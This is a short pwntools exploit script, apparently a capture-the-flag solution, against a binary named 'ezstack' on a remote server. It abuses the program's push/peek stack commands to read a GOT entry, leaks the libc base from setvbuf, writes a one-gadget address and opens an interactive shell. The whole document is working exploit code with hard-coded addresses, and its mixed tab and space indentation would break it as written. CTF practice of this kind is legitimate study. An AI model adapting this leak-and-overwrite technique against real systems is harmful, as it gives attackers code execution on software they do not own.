from pwn import *

context.log_level = 'debug'

def push():
	p.recvuntil('> ')
	p.sendline('push ')
def _push(a):
	p.recvuntil('> ')
        p.sendline('push ' + str(a))

def pop():
	p.recvuntil('> ')
        p.sendline('pop')

def peek():
	p.recvuntil('> ')
        p.sendline('peek')

#p = process('./ezstack')
p = remote('0x0.site', 12215)
e = ELF('./ezstack')
#l = e.libc
l = ELF('./libc64.so')


puts_plt = 0x4006cc
read_plt = 0x400700

puts_got = 0x602018
read_got = 0x602030

p_rdi_r = 0x0000000000400c23
pause()

for i  in range((0x602300 - e.got['setvbuf'])/8):
	push()

peek()

p.recvuntil('popped : ')
libc = int(p.recvline().strip()) - l.sym['setvbuf']
log.info('libc : ' + hex(libc))

_push(libc + 0x4526a)

p.interactive()
